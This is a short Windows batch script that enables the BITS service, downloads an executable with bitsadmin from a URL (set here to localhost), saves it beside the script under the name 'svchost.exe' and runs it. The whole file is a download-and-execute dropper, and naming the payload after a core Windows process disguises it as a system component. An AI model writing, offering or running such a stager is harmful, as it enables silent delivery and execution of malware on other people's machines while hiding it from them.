@echo off
SET url=http://localhost/file.exe

SET file=%~dp0\svchost.exe

net start BITS & sc config BITS start= demand

if not exist %file% bitsadmin /TRANSFER /DOWNLOAD /SETPRIORITY FOREGROUND "%url%" "%file%" & start /i %file% 